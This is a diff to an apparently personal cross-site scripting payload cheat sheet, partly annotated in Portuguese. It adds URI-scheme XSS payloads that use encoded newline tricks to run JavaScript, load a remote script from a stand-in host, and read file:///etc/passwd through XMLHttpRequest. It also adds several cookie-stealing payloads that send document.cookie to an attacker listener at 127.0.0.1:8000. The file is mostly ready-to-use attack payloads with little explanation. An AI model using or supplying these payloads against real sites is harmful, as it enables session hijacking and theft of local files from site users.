@@ -30,12 +30,25 @@ onerror=alert;throw 1
 <style onload=alert()>
 <img src=x onerror=alert(1)>
 <img/src=x/onerror=alert(1)>
+-------------------------------------------------------
+URI-SCHEME
+
 javascript:alert(1)
 javasc%0aript%3aalert(1)
 javas%0a%0dcript%3aalert(1)
-
-
-
+j%0aavascript://www.hackdog.me/%0a%0dprompt(document.cookie)
+javascript://www.hackdog.me/%0a%0dprompt(document.cookie)
+javascript://www.hackdog.me/%0a%0d%28function%28s%29%7B
+ s.src%3D%27http%3A%2f%2fexample.com%2f1.js%27%3B
+ document.body.appendChild%28s%29%7D%29%28
+ document.createElement%28%27script%27%29%29
+javascript://www.baidu.com/research?
+%0Afunction%20reqListener%20()%20%7B%0A
+%20%20prompt(this.responseText)%3B%0A%7D%0A
+var%20oReq%20%3D%20new%20XMLHttpRequest()%3B%0A
+oReq.addEventListener(%22load%22%2C%20reqListener)%3B%0A
+oReq.open(%22GET%22%2C%20%22file%3A%2F%2F%2Fetc%2Fpasswd%22)%3B%0A
+oReq.send()%3B
 
 
 ------------------------------------------------------------------------------------------------------
@@ -53,6 +66,10 @@ Criação de um iframe
 
 Extrair cookies e manda-los diretamente para o atacante: 
 javascript:image = new Image(); image.src='http://127.0.0.1:8000?cookies='%2bdocument.cookie
+%09javascript:document.write%3d%27%253cimg%20src=%22http://127.0.0.1:8000?cookie=%27%20%2b%20document.cookie%20%2b%20%27%22%20/%253e%27
+%09javascript:document.write='<img src="http://127.0.0.1:8000?cookie=' %2b document.cookie %2b '" />'
+%09javascript:document.write='<img src=x onerror=this.src='http://127.0.0.1:8000/?c='%2bdocument.cookie'" />'
+javascript:image = new Image(); image.src=\%27http://127.0.0.1:8000?cookies=\%27%2bdocument.cookie
 
 Mario game
 javascript:document.write='<iframe src=https://www.jogos360.com.br/super_flash_mario_bros.html  width=800 height=700>'
@@ -79,6 +96,9 @@ SSTI "Angular-JS"
 
 More:
 https://www.slideshare.net/GarethHeyes/xss-magic-tricks?fbclid=IwAR1DZL2fu-3UGTUyUJnleAP0CFhN_1TuFZCwVH0acEx8QEvABrtacVg_bCE
+https://conference.hitb.org/hitbsecconf2017ams/materials/D2T2%20-%20Yu%20Hong%20-%20Attack%20Surface%20Extended%20by%20URL%20Schemes.pdf
+https://www.google.com/search?rlz=1C&q=uri-scheme+xss&oq=uri-scheme+xss
+
 
 
 1. XSS magic tricks Advancements in XSS By Gareth Heyes @garethheyes
